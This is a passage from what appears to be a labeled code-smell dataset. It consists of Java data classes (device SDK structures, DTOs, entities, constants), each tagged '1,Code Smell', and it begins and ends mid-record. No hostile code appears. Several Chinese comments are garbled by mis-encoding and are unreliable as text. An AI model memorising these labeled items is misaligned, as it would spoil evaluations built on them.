  }
  public int getSchemaColumnNum(){
    return schemaColumnNum;
  }
  public int getGroupbyColumnNum(){
    return groupbyColumnNum;
  }
  public void setGroupbyColumnNum(  int groupbyColumnNum){
    this.groupbyColumnNum=groupbyColumnNum;
  }
  public Statistics getMvStatistics(){
    return mvStatistics;
  }
  public int getIndex(){
    return index;
  }
  public void setIndex(  int index){
    this.index=index;
  }
}",1,Code Smell
"public static class NET_OUT_QUERY_REC_BAK_RST_TASK extends SdkStructure {
  public int dwSize;
  public Pointer pTasks;
  public int nMaxCount;
  public int nReturnCount;
  public NET_OUT_QUERY_REC_BAK_RST_TASK(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"/** 
 * This object will be created when job finished or cancelled. It is used to edit the job final state.
 */
public class LoadJobFinalOperation extends TxnCommitAttachment implements Writable {
  @SerializedName(""id"") private long id;
  @SerializedName(""ls"") private EtlStatus loadingStatus=new EtlStatus();
  @SerializedName(""ps"") private int progress;
  @SerializedName(""lst"") private long loadStartTimestamp;
  @SerializedName(""ft"") private long finishTimestamp;
  @SerializedName(""js"") private JobState jobState;
  @SerializedName(""fm"") private FailMsg failMsg;
  public LoadJobFinalOperation(){
    super(TransactionState.LoadJobSourceType.BATCH_LOAD_JOB);
  }
  public LoadJobFinalOperation(  long id,  EtlStatus loadingStatus,  int progress,  long loadStartTimestamp,  long finishTimestamp,  JobState jobState,  FailMsg failMsg){
    super(TransactionState.LoadJobSourceType.BATCH_LOAD_JOB);
    this.id=id;
    this.loadingStatus=loadingStatus;
    this.progress=progress;
    this.loadStartTimestamp=loadStartTimestamp;
    this.finishTimestamp=finishTimestamp;
    this.jobState=jobState;
    this.failMsg=failMsg;
  }
  public long getId(){
    return id;
  }
  public EtlStatus getLoadingStatus(){
    return loadingStatus;
  }
  public int getProgress(){
    return progress;
  }
  public long getLoadStartTimestamp(){
    return loadStartTimestamp;
  }
  public long getFinishTimestamp(){
    return finishTimestamp;
  }
  public JobState getJobState(){
    return jobState;
  }
  public FailMsg getFailMsg(){
    return failMsg;
  }
  @Override public void write(  DataOutput out) throws IOException {
    super.write(out);
    out.writeLong(id);
    loadingStatus.write(out);
    out.writeInt(progress);
    out.writeLong(loadStartTimestamp);
    out.writeLong(finishTimestamp);
    Text.writeString(out,jobState.name());
    if (failMsg == null) {
      out.writeBoolean(false);
    }
 else {
      out.writeBoolean(true);
      failMsg.write(out);
    }
  }
  public void readFields(  DataInput in) throws IOException {
    super.readFields(in);
    id=in.readLong();
    loadingStatus.readFields(in);
    progress=in.readInt();
    loadStartTimestamp=in.readLong();
    finishTimestamp=in.readLong();
    jobState=JobState.valueOf(Text.readString(in));
    if (in.readBoolean()) {
      failMsg=new FailMsg();
      failMsg.readFields(in);
    }
  }
  @Override public String toString(){
    return ""LoadJobEndOperation{"" + ""id="" + id + "", loadingStatus=""+ loadingStatus+ "", progress=""+ progress+ "", loadStartTimestamp=""+ loadStartTimestamp+ "", finishTimestamp=""+ finishTimestamp+ "", jobState=""+ jobState+ "", failMsg=""+ failMsg+ '}';
  }
}
",1,Code Smell
"public static class USER_MANAGE_INFO_EX extends SdkStructure {
  public int dwRightNum;
  public OPR_RIGHT_EX[] rightList=(OPR_RIGHT_EX[])new OPR_RIGHT_EX().toArray(NET_MAX_RIGHT_NUM);
  public int dwGroupNum;
  public USER_GROUP_INFO_EX[] groupList=(USER_GROUP_INFO_EX[])new USER_GROUP_INFO_EX().toArray(NET_MAX_GROUP_NUM);
  public int dwUserNum;
  public USER_INFO_EX[] userList=(USER_INFO_EX[])new USER_INFO_EX().toArray(NET_MAX_USER_NUM);
  public int dwFouctionMask;
  public byte byNameMaxLength;
  public byte byPSWMaxLength;
  public byte[] byReserve=new byte[254];
}",1,Code Smell
"public static class EM_NET_PLATE_COLOR_TYPE extends SdkStructure {
  public static final int NET_PLATE_COLOR_OTHER=0;
  public static final int NET_PLATE_COLOR_BLUE=1;
  public static final int NET_PLATE_COLOR_YELLOW=2;
  public static final int NET_PLATE_COLOR_WHITE=3;
  public static final int NET_PLATE_COLOR_BLACK=4;
  public static final int NET_PLATE_COLOR_YELLOW_BOTTOM_BLACK_TEXT=5;
  public static final int NET_PLATE_COLOR_BLUE_BOTTOM_WHITE_TEXT=6;
  public static final int NET_PLATE_COLOR_BLACK_BOTTOM_WHITE_TEXT=7;
  public static final int NET_PLATE_COLOR_SHADOW_GREEN=8;
  public static final int NET_PLATE_COLOR_YELLOW_GREEN=9;
}",1,Code Smell
"/** 
 * A container class for hooks applied in the snapshot phase, including: <ul> <li> {@link #preHighWatermarkAction}: Hook to run before emitting high watermark, which is for testing whether binlog events created within snapshot phase are backfilled correctly. <li> {@link #postHighWatermarkAction}: Hook to run after emitting high watermark, which is for testing actions handling binlog events between snapshot splits. </ul>
 */
public class SnapshotPhaseHooks implements Serializable {
  private static final long serialVersionUID=1L;
  private SnapshotPhaseHook preLowWatermarkAction;
  private SnapshotPhaseHook postLowWatermarkAction;
  private SnapshotPhaseHook preHighWatermarkAction;
  private SnapshotPhaseHook postHighWatermarkAction;
  public void setPreHighWatermarkAction(  SnapshotPhaseHook preHighWatermarkAction){
    this.preHighWatermarkAction=preHighWatermarkAction;
  }
  public void setPostHighWatermarkAction(  SnapshotPhaseHook postHighWatermarkAction){
    this.postHighWatermarkAction=postHighWatermarkAction;
  }
  public void setPreLowWatermarkAction(  SnapshotPhaseHook preLowWatermarkAction){
    this.preLowWatermarkAction=preLowWatermarkAction;
  }
  public void setPostLowWatermarkAction(  SnapshotPhaseHook postLowWatermarkAction){
    this.postLowWatermarkAction=postLowWatermarkAction;
  }
  @Nullable public SnapshotPhaseHook getPreHighWatermarkAction(){
    return preHighWatermarkAction;
  }
  @Nullable public SnapshotPhaseHook getPostHighWatermarkAction(){
    return postHighWatermarkAction;
  }
  @Nullable public SnapshotPhaseHook getPreLowWatermarkAction(){
    return preLowWatermarkAction;
  }
  @Nullable public SnapshotPhaseHook getPostLowWatermarkAction(){
    return postLowWatermarkAction;
  }
  public static SnapshotPhaseHooks empty(){
    return new SnapshotPhaseHooks();
  }
}",1,Code Smell
"/** 
 * Broker quality statistics. Record the request number and success response number of a broker. We analyze the broker quality based on these information.
 */
public class BrokerStatsDltTuple {
  private long sendNum=0L;
  private long succRecvNum=0L;
  public BrokerStatsDltTuple(  long succRecvNum,  long sendNum){
    this.succRecvNum=succRecvNum;
    this.sendNum=sendNum;
  }
  public long getSendNum(){
    return sendNum;
  }
  public void setSendNum(  long sendNum){
    this.sendNum=sendNum;
  }
  public long getSuccRecvNum(){
    return succRecvNum;
  }
  public void setSuccRecvNum(  long succRecvNum){
    this.succRecvNum=succRecvNum;
  }
  @Override public String toString(){
    return ""{sendNum="" + this.sendNum + "",succRecvNum=""+ this.succRecvNum+ ""}"";
  }
}",1,Code Smell
"@JSONType(orders={""appName"",""hostIdc"",""hostunit"",""nodegroup"",""idc"",""hostIp"",""agg_version"",""group""}) public static class Tags {
  public String appName;
  public String hostIdc;
  public String hostunit;
  public String nodegroup;
  public String idc;
  public String agg_version;
  public String hostIp;
  public String group;
  @JSONField(unwrapped=true) public Map<String,String> attributes=new HashMap<String,String>();
}
",1,Code Smell
"public static class NET_DVR_PLAN_TEMPLATE_COND extends Structure {
  public int dwSize;
  public int dwPlanTemplateNumber;
  public short wLocalControllerID;
  public byte[] byRes=new byte[106];
}",1,Code Smell
"/** 
 * Message queue prohibits consumption configuration
 * @author lilai
 * @since 2023-12-07
 */
public class ProhibitionConfig {
  private boolean enableKafkaProhibition=false;
  private Set<String> kafkaTopics=new HashSet<>();
  private boolean enableRocketMqProhibition=false;
  private Set<String> rocketMqTopics=new HashSet<>();
  public boolean isEnableKafkaProhibition(){
    return enableKafkaProhibition;
  }
  public void setEnableKafkaProhibition(  boolean enableKafkaProhibition){
    this.enableKafkaProhibition=enableKafkaProhibition;
  }
  public Set<String> getKafkaTopics(){
    return kafkaTopics;
  }
  public void setKafkaTopics(  Set<String> kafkaTopics){
    this.kafkaTopics=kafkaTopics;
  }
  public boolean isEnableRocketMqProhibition(){
    return enableRocketMqProhibition;
  }
  public void setEnableRocketMqProhibition(  boolean enableRocketMqProhibition){
    this.enableRocketMqProhibition=enableRocketMqProhibition;
  }
  public Set<String> getRocketMqTopics(){
    return rocketMqTopics;
  }
  public void setRocketMqTopics(  Set<String> rocketMqTopics){
    this.rocketMqTopics=rocketMqTopics;
  }
  @Override public String toString(){
    return ""enableKafkaProhibition="" + enableKafkaProhibition + "", kafkaTopics=""+ kafkaTopics+ ""; ""+ ""enableRocketMqProhibition=""+ enableRocketMqProhibition+ "", rocketMqTopics=""+ rocketMqTopics;
  }
}",1,Code Smell
"/** 
 * @author harris
 */
public class ResourceDTO extends ResourceDetailDTO implements Serializable {
  private static final long serialVersionUID=1L;
  private String taskId;
  private String type;
  private String applyUser;
  private String taskName;
  private String resourceStr;
  private String ruleId;
  private String ruleName;
  private String accountName;
  private String suggestion;
  public String getTaskId(){
    return taskId;
  }
  public void setTaskId(  String taskId){
    this.taskId=taskId;
  }
  public String getType(){
    return type;
  }
  public void setType(  String type){
    this.type=type;
  }
  public String getApplyUser(){
    return applyUser;
  }
  public void setApplyUser(  String applyUser){
    this.applyUser=applyUser;
  }
  public String getTaskName(){
    return taskName;
  }
  public void setTaskName(  String taskName){
    this.taskName=taskName;
  }
  public String getResourceStr(){
    return resourceStr;
  }
  public void setResourceStr(  String resourceStr){
    this.resourceStr=resourceStr;
  }
  public String getRuleId(){
    return ruleId;
  }
  public void setRuleId(  String ruleId){
    this.ruleId=ruleId;
  }
  public String getRuleName(){
    return ruleName;
  }
  public void setRuleName(  String ruleName){
    this.ruleName=ruleName;
  }
  public String getAccountName(){
    return accountName;
  }
  public void setAccountName(  String accountName){
    this.accountName=accountName;
  }
  public String getSuggestion(){
    return suggestion;
  }
  public void setSuggestion(  String suggestion){
    this.suggestion=suggestion;
  }
}",1,Code Smell
"/** 
 * @author lin
 */
public class PlayBackResult<T> {
  private int code;
  private String msg;
  private T data;
  private MediaServer mediaServerItem;
  private JSONObject response;
  private SipSubscribe.EventResult<EventObject> event;
  public int getCode(){
    return code;
  }
  public void setCode(  int code){
    this.code=code;
  }
  public T getData(){
    return data;
  }
  public void setData(  T data){
    this.data=data;
  }
  public MediaServer getMediaServerItem(){
    return mediaServerItem;
  }
  public void setMediaServerItem(  MediaServer mediaServerItem){
    this.mediaServerItem=mediaServerItem;
  }
  public JSONObject getResponse(){
    return response;
  }
  public void setResponse(  JSONObject response){
    this.response=response;
  }
  public SipSubscribe.EventResult<EventObject> getEvent(){
    return event;
  }
  public void setEvent(  SipSubscribe.EventResult<EventObject> event){
    this.event=event;
  }
  public String getMsg(){
    return msg;
  }
  public void setMsg(  String msg){
    this.msg=msg;
  }
}
",1,Code Smell
"public static class ALARM_ENCLOSURE_ALARM_INFO extends SdkStructure {
  public int dwSize;
  public int dwAlarmType;
  public int dwAlarmDetail;
  public int emState;
  public int dwDriverNo;
  public int dwEnclosureID;
  public int dwLimitSpeed;
  public int dwCurrentSpeed;
  public NET_TIME_EX stuTime;
  public NET_GPS_STATUS_INFO stuGPSStatusInfo;
  public ALARM_ENCLOSURE_ALARM_INFO(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"/** 
 * @author jc1e
 */
@TableName(""alert_group"") public class AlertGoup {
  @TableId(value=""id"",type=IdType.AUTO) private Long id;
  @TableField(value=""topic_name"") private String topicName;
  @TableField(exist=false) private ClusterInfo cluster;
  @TableField(value=""consummer_group"") private String consummerGroup;
  @TableField(value=""consummer_api"") private String consummerApi;
  private Integer threshold;
  private Integer dispause;
  @TableField(value=""cluster_id"") private Integer clusterId;
  @TableField(value=""mail_to"") private String mailTo;
  @TableField(value=""create_date"") private Date createDate;
  @TableField(value=""owner_id"") private Long ownerId;
  @TableField(value=""disable_alerta"") private boolean disableAlerta;
  private boolean enable;
  @TableField(exist=false) private UserInfo owner;
  private String webhook;
  public boolean isEnable(){
    return enable;
  }
  public void setEnable(  boolean enable){
    this.enable=enable;
  }
  public Long getOwnerId(){
    return ownerId;
  }
  public void setOwnerId(  Long ownerId){
    this.ownerId=ownerId;
  }
  public boolean isDisableAlerta(){
    return disableAlerta;
  }
  public void setDisableAlerta(  boolean disableAlerta){
    this.disableAlerta=disableAlerta;
  }
  public Date getCreateDate(){
    return createDate;
  }
  public UserInfo getOwner(){
    return owner;
  }
  public void setOwner(  UserInfo owner){
    this.owner=owner;
  }
  public void setCreateDate(  Date createDate){
    this.createDate=createDate;
  }
  public Integer getClusterId(){
    return clusterId;
  }
  public void setClusterId(  Integer clusterId){
    this.clusterId=clusterId;
  }
  public Long getId(){
    return id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getTopicName(){
    return topicName;
  }
  public void setTopicName(  String topicName){
    this.topicName=topicName;
  }
  public String getConsummerGroup(){
    return consummerGroup;
  }
  public void setConsummerGroup(  String consummerGroup){
    this.consummerGroup=consummerGroup;
  }
  public String getConsummerApi(){
    return consummerApi;
  }
  public void setConsummerApi(  String consummerApi){
    this.consummerApi=consummerApi;
  }
  public Integer getThreshold(){
    return threshold;
  }
  public void setThreshold(  Integer threshold){
    this.threshold=threshold;
  }
  public Integer getDispause(){
    return dispause;
  }
  public void setDispause(  Integer dispause){
    this.dispause=dispause;
  }
  public String getMailTo(){
    return mailTo;
  }
  public void setMailTo(  String mailTo){
    this.mailTo=mailTo;
  }
  public String getWebhook(){
    return webhook;
  }
  public void setWebhook(  String webhook){
    this.webhook=webhook;
  }
  public ClusterInfo getCluster(){
    return cluster;
  }
  public void setCluster(  ClusterInfo cluster){
    this.cluster=cluster;
  }
}",1,Code Smell
"public static class NET_PTZ_PRESET_LIST extends SdkStructure {
  public int dwSize;
  public int dwMaxPresetNum;
  public int dwRetPresetNum;
  public Pointer pstuPtzPorsetList;
  public NET_PTZ_PRESET_LIST(){
    this.dwSize=this.size();
  }
}
",1,Code Smell
"/** 
 * 分机信息
 * @author Joancy
 */
public static class UnitInfo {
  private String host=null;
  private int port=8281;
  public UnitInfo(){
  }
  public String getHost(){
    return host;
  }
  public void setHost(  String host){
    this.host=host;
  }
  public int getPort(){
    return port;
  }
  public void setPort(  int port){
    this.port=port;
  }
}",1,Code Smell
"public class CockroachDBBetweenOperation implements CockroachDBExpression {
  private final CockroachDBExpression expr;
  private final CockroachDBExpression left;
  private final CockroachDBExpression right;
  private CockroachDBBetweenOperatorType type;
  public enum CockroachDBBetweenOperatorType {  BETWEEN(""BETWEEN""),   NOT_BETWEEN(""NOT BETWEEN""),   BETWEEN_SYMMETRIC(""BETWEEN SYMMETRIC""),   NOT_BETWEEN_SYMMETRIC(""NOT BETWEEN SYMMETRIC"");   private String s;
  CockroachDBBetweenOperatorType(  String s){
    this.s=s;
  }
  public String getStringRepresentation(){
    return s;
  }
  public static CockroachDBBetweenOperatorType getRandom(){
    return Randomly.fromOptions(values());
  }
}
  public CockroachDBBetweenOperation(  CockroachDBExpression expr,  CockroachDBExpression left,  CockroachDBExpression right,  CockroachDBBetweenOperatorType type){
    this.expr=expr;
    this.left=left;
    this.right=right;
    this.type=type;
  }
  public CockroachDBExpression getLeft(){
    return left;
  }
  public CockroachDBExpression getRight(){
    return right;
  }
  public CockroachDBExpression getExpr(){
    return expr;
  }
  public CockroachDBBetweenOperatorType getType(){
    return type;
  }
}
",1,Code Smell
"public class GetCouponByQrCode implements Serializable {
  @ApiModelProperty(value=""浼樻儬鍒哥被鍨媔d"",required=true) private String couponActivityCouponTypeId;
  @ApiModelProperty(value=""浜岀淮鐮乮d"",required=true) private String qrCodeId;
  @ApiModelProperty(value=""杞︾墝鍙�"",required=false) private String numberPlate;
  @ApiModelProperty(value=""浜岀淮鐮佸垱寤鸿�卛d"",required=false) private String qrCodeCreateId;
  @ApiModelProperty(value=""浼樻儬鍒哥被鍨�(1-娆℃暟鍒�/2-閲戦鍒�/3-鏃堕暱鍒�)"",required=false) private Byte couponType;
  @ApiModelProperty(value=""鏁伴噺锛屽彂閫佹椂闀胯〃绀哄皬鏃舵暟锛屾鏁板埜琛ㄧず娆℃暟"",required=false) private Integer quantity;
  public String getCouponActivityCouponTypeId(){
    return couponActivityCouponTypeId;
  }
  public void setCouponActivityCouponTypeId(  String couponActivityCouponTypeId){
    this.couponActivityCouponTypeId=couponActivityCouponTypeId;
  }
  public String getQrCodeId(){
    return qrCodeId;
  }
  public void setQrCodeId(  String qrCodeId){
    this.qrCodeId=qrCodeId;
  }
  public String getNumberPlate(){
    return numberPlate;
  }
  public void setNumberPlate(  String numberPlate){
    this.numberPlate=numberPlate;
  }
  public String getQrCodeCreateId(){
    return qrCodeCreateId;
  }
  public void setQrCodeCreateId(  String qrCodeCreateId){
    this.qrCodeCreateId=qrCodeCreateId;
  }
  public Byte getCouponType(){
    return couponType;
  }
  public void setCouponType(  Byte couponType){
    this.couponType=couponType;
  }
  public Integer getQuantity(){
    return quantity;
  }
  public void setQuantity(  Integer quantity){
    this.quantity=quantity;
  }
}",1,Code Smell
"public class MailAttachmentInfo {
  private String attachmentName;
  private InputStreamSource inputStreamSource;
  public MailAttachmentInfo(){
  }
  public MailAttachmentInfo(  String attachmentName,  InputStreamSource inputStreamSource){
    this.attachmentName=attachmentName;
    this.inputStreamSource=inputStreamSource;
  }
  public String getAttachmentName(){
    return attachmentName;
  }
  public void setAttachmentName(  String attachmentName){
    this.attachmentName=attachmentName;
  }
  public InputStreamSource getInputStreamSource(){
    return inputStreamSource;
  }
  public void setInputStreamSource(  InputStreamSource inputStreamSource){
    this.inputStreamSource=inputStreamSource;
  }
}
",1,Code Smell
"public static class NET_BUS_TYPE extends SdkStructure {
  public static final int NET_BUS_TYPE_UNKNOWN=0;
  public static final int NET_BUS_TYPE_MBUS=1;
  public static final int NET_BUS_TYPE_RS485=2;
  public static final int NET_BUS_TYPE_CAN=3;
}",1,Code Smell
"public static class ClassFileInfo {
  ClassFileInfo(  JavaFileObject fo,  ClassFile cf,  byte[] digest,  int size){
    this.fo=fo;
    this.cf=cf;
    this.digest=digest;
    this.size=size;
  }
  public final JavaFileObject fo;
  public final ClassFile cf;
  public final byte[] digest;
  public final int size;
}
",1,Code Smell
"/** 
 * 浣滆:鏋楀浗瀹 閭欢:lingguoding@gmail.com 鍒涘缓鏃堕棿:2021/2/27 涓嬪崍5:36 鎻忚堪:
 */
public class ForwardParam {
  private String deviceIP;
  private String username;
  private String password;
  private short port;
  public String getDeviceIP(){
    return deviceIP;
  }
  public void setDeviceIP(  String deviceIP){
    this.deviceIP=deviceIP;
  }
  public String getUsername(){
    return username;
  }
  public void setUsername(  String username){
    this.username=username;
  }
  public String getPassword(){
    return password;
  }
  public void setPassword(  String password){
    this.password=password;
  }
  public short getPort(){
    return port;
  }
  public void setPort(  short port){
    this.port=port;
  }
}",1,Code Smell
"public static class NET_OPENDOOR_MATCHINFO extends SdkStructure {
  public byte[] szUserID=new byte[32];
  public byte[] szUserName=new byte[32];
  public int emUserType;
  public byte[] szName=new byte[64];
  public int nMatchRate;
  public int emOpenDoorType;
  public NET_TIME stuActivationTime;
  public NET_TIME stuExpiryTime;
  public int nScore;
  public byte[] szCompanyName=new byte[MAX_COMPANY_NAME_LEN];
  public byte[] szCompanionName=new byte[120];
  public byte[] szCompanionCompany=new byte[MAX_COMPANY_NAME_LEN];
  public byte[] szPermissibleArea=new byte[MAX_COMMON_STRING_128];
  public byte[] szSection=new byte[200];
  public Pointer pstuCustomEducationInfo;
  public Pointer pstuHealthCodeInfo;
  public byte[] szRoomNo=new byte[32];
  public Pointer pstuIDCardInfo;
  public byte[] byReserved=new byte[64];
}",1,Code Smell
"public final class NetConstant {
  /** 
 * http:// 
 */
  public static final String HTTP=""http://"";
  /** 
 * 鍐掑彿: 
 */
  public static final String COLON="":"";
  /** 
 * 鏂滄潬/ 
 */
  public static final String SLASH=""/"";
  /** 
 * 杩炴帴杩愯鏈嶅姟鍣ㄨ秴鏃舵椂闂� 10绉� 
 */
  public static final Integer SERVER_TIME_OUT_ACTIVE=10000;
  /** 
 * 璇诲彇鏈嶅姟鍣ㄨ秴鏃舵椂闂� 3000 
 */
  public static final Integer READ_TIME_OUT=3000;
  /** 
 * 杩炴帴FLINK鍘嗗彶鏈嶅姟鍣ㄨ秴鏃舵椂闂� 2000 
 */
  public static final Integer SERVER_TIME_OUT_HISTORY=3000;
}",1,Code Smell
"public static class NET_COAXIAL_CONTROL_IO_INFO extends SdkStructure {
  public int emType;
  public int emSwicth;
  public int emMode;
  public byte[] byReserved=new byte[128];
}",1,Code Smell
"@Entity public class Author {
  @Id Long id;
  String firstName;
  String lastName;
  public Author(){
  }
  public Author(  Long id,  String firstName,  String lastName){
    this.id=id;
    this.firstName=firstName;
    this.lastName=lastName;
  }
  public Long getId(){
    return this.id;
  }
  public void setId(  Long id){
    this.id=id;
  }
  public String getFirstName(){
    return this.firstName;
  }
  public void setFirstName(  String firstName){
    this.firstName=firstName;
  }
  public String getLastName(){
    return this.lastName;
  }
  public void setLastName(  String lastName){
    this.lastName=lastName;
  }
  public String getFullName(){
    return this.firstName + "" "" + this.lastName;
  }
}
",1,Code Smell
"private static final class MediaItemChange {
  public final EditedMediaItem editedMediaItem;
  public final long durationUs;
  @Nullable public final Format format;
  public final boolean isLast;
  public MediaItemChange(  EditedMediaItem editedMediaItem,  long durationUs,  @Nullable Format format,  boolean isLast){
    this.editedMediaItem=editedMediaItem;
    this.durationUs=durationUs;
    this.format=format;
    this.isLast=isLast;
  }
}
",1,Code Smell
"public static class NET_CFG_LINKGROUP_INFO extends SdkStructure {
  public boolean bEnable;
  public byte[] szGroupID=new byte[64];
  public byte bySimilarity;
  public byte[] bReserved1=new byte[3];
  public byte[] szColorName=new byte[32];
  public boolean bShowTitle;
  public boolean bShowPlate;
  public NET_ALARM_MSG_HANDLE stuEventHandler;
  public byte[] bReserved=new byte[512];
}",1,Code Smell
"/** 
 * @author wh1t3P1g
 * @since 2020/12/12
 */
@Getter @Setter public abstract class ValueSwitcher extends AbstractJimpleValueSwitch {
  public Context context;
  public DataContainer dataContainer;
  public MethodReference methodRef;
  public TabbyVariable rvar;
  public boolean unbind=false;
  public boolean reset=true;
  public Unit unit;
  public CallEdgeBuilder builder=null;
}",1,Code Smell
"public static class NET_THERMO_GRAPHY_OPTREGION extends SdkStructure {
  public int bOptimizedRegion;
  public int nOptimizedROIType;
  public int nCustomRegion;
  public NET_RECT[] stCustomRegions=(NET_RECT[])new NET_RECT().toArray(64);
  public byte[] Reserved=new byte[256];
}",1,Code Smell
"/** 
 * This class introduces new  {@link Event}s for  {@link MFXTableColumn}s, such as: <p> - SORTING_EVENT: this event is used to tell the table view skin that the column is being sorted
 */
@SuppressWarnings(""rawtypes"") public static class MFXTableColumnEvent<T> extends Event {
  private final MFXTableColumn<T> column;
  private final Comparator<T> comparator;
  private final SortState sortState;
  public static final EventType<? extends MFXTableColumnEvent> SORTING_EVENT=new EventType<>(ANY,""SORTING_EVENT"");
  public MFXTableColumnEvent(  EventType<? extends Event> eventType,  MFXTableColumn<T> column,  Comparator<T> comparator,  SortState sortState){
    super(eventType);
    this.column=column;
    this.comparator=comparator;
    this.sortState=sortState;
  }
  public MFXTableColumn<T> getColumn(){
    return column;
  }
  public Comparator<T> getComparator(){
    return comparator;
  }
  public SortState getSortState(){
    return sortState;
  }
}
",1,Code Smell
"public static class TextDTO {
  private String content;
  private List<String> mentionedList;
  private List<String> mentionedMobileList;
  public String getContent(){
    return content;
  }
  public void setContent(  String content){
    this.content=content;
  }
  public List<String> getMentionedList(){
    return mentionedList;
  }
  public void setMentionedList(  List<String> mentionedList){
    this.mentionedList=mentionedList;
  }
  public List<String> getMentionedMobileList(){
    return mentionedMobileList;
  }
  public void setMentionedMobileList(  List<String> mentionedMobileList){
    this.mentionedMobileList=mentionedMobileList;
  }
}
",1,Code Smell
"public static class NET_DVR_PICCFG_EX extends Structure {
  public int dwSize;
  public byte[] sChanName=new byte[NAME_LEN];
  public int dwVideoFormat;
  public byte byBrightness;
  public byte byContrast;
  public byte bySaturation;
  public byte byHue;
  public int dwShowChanName;
  public short wShowNameTopLeftX;
  public short wShowNameTopLeftY;
  public NET_DVR_VILOST struVILost;
  public NET_DVR_MOTION struMotion;
  public NET_DVR_HIDEALARM struHideAlarm;
  public int dwEnableHide;
  public NET_DVR_SHELTER[] struShelter=new NET_DVR_SHELTER[MAX_SHELTERNUM];
  public int dwShowOsd;
  public short wOSDTopLeftX;
  public short wOSDTopLeftY;
  public byte byOSDType;
  public byte byDispWeek;
  public byte byOSDAttrib;
  public byte byHourOsdType;
}
",1,Code Smell
"/** 
 * @author lg99send to alerta constants
 */
public class AlertConfig {
  public static final String CODE=""code"";
  public static final String RESOURCE=""resource"";
  public static final String EVENT=""event"";
  public static final String STATUS=""status"";
  public static final String ENVIRONMENT=""environment"";
  public static final String SEVERITY=""severity"";
  public static final String CORRELATE=""correlate"";
  public static final String SERVICE=""service"";
  public static final String GROUP=""group"";
  public static final String VALUE=""value"";
  public static final String TEXT=""text"";
  public static final String TAGS=""tags"";
  public static final String ATTRIBUTES=""attributes"";
  public static final String ORIGIN=""origin"";
  public static final String TYPE=""type"";
  public static final String CREATETIME=""createTime"";
  public static final String TIMEOUT=""timeout"";
  public static final String RAWDATA=""rawData"";
  public static final String CUSTOMER=""customer"";
  public static final String CONSUMER_SEVERITY=""warning"";
  public static final String CONSUMER_GROUP=""XAECBigdata"";
  public static final String CONSUMER_ORIGIN=""Group Consumer Lag"";
  public static final String CONSUMER_TYPE=""lagAlert"";
  public static final String DEPARTMENT=""Department"";
  public static final String NAME=""Name"";
}",1,Code Smell
"@TableName(""sp_task"") public class Task {
  @TableId(type=IdType.AUTO) private Integer id;
  private String flowId;
  private Date beginTime;
  private Date endTime;
  public Integer getId(){
    return id;
  }
  public void setId(  Integer id){
    this.id=id;
  }
  public String getFlowId(){
    return flowId;
  }
  public void setFlowId(  String flowId){
    this.flowId=flowId;
  }
  public Date getBeginTime(){
    return beginTime;
  }
  public void setBeginTime(  Date beginTime){
    this.beginTime=beginTime;
  }
  public Date getEndTime(){
    return endTime;
  }
  public void setEndTime(  Date endTime){
    this.endTime=endTime;
  }
}
",1,Code Smell
"public final class RespHead extends JceStruct {
  static byte[] cache_vCookies;
  public int iResult;
  public int iVersion;
  public String strErrorMsg;
  public byte[] vCookies;
}
",1,Code Smell
"public static final class ExtraValue {
  /** 
 * The subtype extra value used to indicate that this subtype is capable of entering ASCII characters.
 */
  public static final String ASCII_CAPABLE=""AsciiCapable"";
  /** 
 * The subtype extra value used to indicate that this subtype is enabled when the default subtype is not marked as ascii capable.
 */
  public static final String ENABLED_WHEN_DEFAULT_IS_NOT_ASCII_CAPABLE=""EnabledWhenDefaultIsNotAsciiCapable"";
  /** 
 * The subtype extra value used to indicate that this subtype is capable of entering emoji characters.
 */
  public static final String EMOJI_CAPABLE=""EmojiCapable"";
  /** 
 * Indicates that the subtype does not have a shift key 
 */
  public static final String NO_SHIFT_KEY=""NoShiftKey"";
  /** 
 * Indicates that for this subtype corrections should not be based on proximity of keys for when shifted 
 */
  public static final String NO_SHIFT_PROXIMITY_CORRECTION=""NoShiftProximityCorrection"";
  /** 
 * The subtype extra value used to indicate that the display name of this subtype contains a ""%s"" for printf-like replacement and it should be replaced by this extra value. This extra value is supported on JellyBean and later.
 */
  public static final String UNTRANSLATABLE_STRING_IN_SUBTYPE_NAME=""UntranslatableReplacementStringInSubtypeName"";
  /** 
 * The subtype extra value used to indicate this subtype keyboard layout set name. This extra value is private to LatinIME.
 */
  public static final String KEYBOARD_LAYOUT_SET=""KeyboardLayoutSet"";
  /** 
 * The subtype extra value used to indicate that this subtype is an additional subtype that the user defined. This extra value is private to LatinIME.
 */
  public static final String IS_ADDITIONAL_SUBTYPE=""isAdditionalSubtype"";
  /** 
 * The subtype extra value used to specify the combining rules.
 */
  public static final String COMBINING_RULES=""CombiningRules"";
  private ExtraValue(){
  }
}
",1,Code Smell
"/** 
 * 闂ㄧ鎸囩汗淇℃伅鎿嶄綔锛氬銆佸垹銆佹敼銆佹煡銆佹竻绌�
 */
public static class NET_EM_ACCESS_CTL_FINGERPRINT_SERVICE extends SdkStructure {
  public static final int NET_EM_ACCESS_CTL_FINGERPRINT_SERVICE_INSERT=0;
  public static final int NET_EM_ACCESS_CTL_FINGERPRINT_SERVICE_GET=1;
  public static final int NET_EM_ACCESS_CTL_FINGERPRINT_SERVICE_UPDATE=2;
  public static final int NET_EM_ACCESS_CTL_FINGERPRINT_SERVICE_REMOVE=3;
  public static final int NET_EM_ACCESS_CTL_FINGERPRINT_SERVICE_CLEAR=4;
}",1,Code Smell
"public final class GProAudioBotStatusInfo {
  long botId;
  long botTrtcId;
  long botUin;
  long channelId;
  int detailType;
  String detailUrl;
  String statusText;
  int statusType;
  public GProAudioBotStatusInfo(){
    this.statusText="""";
    this.detailUrl="""";
  }
  public long getBotId(){
    return this.botId;
  }
  public long getBotTrtcId(){
    return this.botTrtcId;
  }
  public long getBotUin(){
    return this.botUin;
  }
  public long getChannelId(){
    return this.channelId;
  }
  public int getDetailType(){
    return this.detailType;
  }
  public String getDetailUrl(){
    return this.detailUrl;
  }
  public String getStatusText(){
    return this.statusText;
  }
  public int getStatusType(){
    return this.statusType;
  }
  public String toString(){
    return ""GProAudioBotStatusInfo{channelId="" + this.channelId + "",botId=""+ this.botId+ "",botUin=""+ this.botUin+ "",statusType=""+ this.statusType+ "",statusText=""+ this.statusText+ "",detailUrl=""+ this.detailUrl+ "",detailType=""+ this.detailType+ "",botTrtcId=""+ this.botTrtcId+ "",}"";
  }
  public GProAudioBotStatusInfo(  long j2,  long j3,  long j4,  int i2,  String str,  String str2,  int i3,  long j5){
